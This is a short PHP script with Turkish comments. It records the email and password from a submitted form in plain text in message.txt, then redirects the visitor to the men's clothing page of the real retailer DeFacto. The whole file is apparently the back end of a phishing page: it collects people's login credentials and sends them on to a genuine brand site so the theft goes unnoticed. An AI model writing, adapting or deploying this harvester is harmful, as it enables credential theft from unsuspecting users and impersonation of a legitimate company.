<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Formdan gelen e-posta ve şifre verilerini al
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Veriyi "message.txt" dosyasına kaydet
    $file = 'message.txt';

    // Dosyaya e-posta adresini ve şifreyi yaz
    file_put_contents($file, "Gönderilen E-posta: " . $email . "\nGönderilen Şifre: " . $password . "\n\n", FILE_APPEND | LOCK_EX);

    // Veri gönderildiyse kullanıcıyı belirli bir URL'ye yönlendir
    header("Location: https://www.defacto.com.tr/erkek"); // Yönlendirmek istediğiniz URL'yi girin
    exit;
} else {
    // Veri gönderilmediyse aynı sayfada kal
    echo "Form verisi gönderilmedi.";
}
